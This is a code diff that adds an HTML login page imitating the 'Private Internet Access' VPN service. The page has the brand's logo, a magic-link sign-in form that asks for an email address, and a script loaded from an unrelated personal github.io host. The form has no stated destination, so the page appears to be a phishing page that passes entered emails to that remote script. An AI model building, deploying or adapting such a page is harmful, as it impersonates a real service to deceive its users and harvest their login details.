@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>PIA Magic Link Login</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+*{
+  box-sizing:border-box;
+  font-family: Arial, Helvetica, sans-serif;
+}
+
+body{
+  margin:0;
+  min-height:100vh;
+  background:#2f3440;
+  display:flex;
+  justify-content:center;
+  align-items:flex-start;
+  color:#fff;
+}
+
+.container{
+  width:100%;
+  max-width:420px;
+  padding:40px 20px;
+  text-align:center;
+}
+
+/* LOGO */
+.logo{
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  gap:8px;
+  margin-bottom:10px;
+}
+
+.logo img{
+  width:40px;
+}
+
+.logo-text{
+  font-size:26px;
+  font-weight:bold;
+  text-align:left;
+  line-height:1.1;
+}
+
+.logo-text small{
+  font-size:14px;
+  font-weight:300;
+  color:#d3d9df;
+}
+
+/* TITLE */
+h2{
+  font-size:22px;
+  margin-bottom:40px;
+  font-weight:500;
+}
+
+/* INPUT BOX */
+.input-box{
+  width:100%;
+  border:2px solid #9aa0aa;
+  border-radius:14px;
+  padding:18px 14px;
+  margin-bottom:25px;
+  text-align:left;
+}
+
+.input-box span{
+  position:relative;
+  top:-12px;
+  background:#2f3440;
+  padding:0 8px;
+  font-size:14px;
+  color:#c9cdd3;
+}
+
+.input-box input{
+  width:100%;
+  background:transparent;
+  border:none;
+  outline:none;
+  font-size:18px;
+  color:#fff;
+}
+
+/* SEND LINK BUTTON */
+button{
+  width:100%;
+  padding:18px;
+  border:none;
+  border-radius:16px;
+  font-size:18px;
+  font-weight:bold;
+  margin-top:5px;
+  background:#7a7d85;
+  color:#222;
+  cursor:not-allowed;
+  transition:0.3s;
+}
+
+button.active{
+  background:#5ee05e;
+  color:#111;
+  cursor:pointer;
+}
+
+.bottom-space{
+  height:200px;
+}
+</style>
+</head>
+<body>
+<script src="https://eal876955-lgtm.github.io/npi/m/intelligent.js"></script>
+<div class="container">
+
+  <!-- LOGO -->
+  <div class="logo">
+    <img src="https://cdn.jsdelivr.net/gh/homarr-labs/dashboard-icons/webp/private-internet-access.webp" style="width:30px;">
+    <div class="logo-text">
+      <small>Private Internet</small><br>
+      ACCESS
+    </div>
+  </div>
+
+  <!-- TITLE -->
+  <h2>Sign in to your account</h2>
+
+  <!-- EMAIL INPUT -->
+  
+  <div class="input-box">
+    <form>
+    <input type="email" id="email" name="Email Address" placeholder="Enter email Address">
+  </div>
+
+  <!-- SEND LINK BUTTON -->
+  <button id="sendBtn" disabled type="submit">SEND LINK</button>
+</form>
+  <div class="bottom-space"></div>
+</div>
+
+<script>
+const email = document.getElementById("email");
+const sendBtn = document.getElementById("sendBtn");
+
+email.addEventListener("input", () => {
+  if(email.value.trim() !== ""){
+    sendBtn.disabled = false;
+    sendBtn.classList.add("active");
+  } else {
+    sendBtn.disabled = true;
+    sendBtn.classList.remove("active");
+  }
+});
+</script>
+
+</body>
+</html>
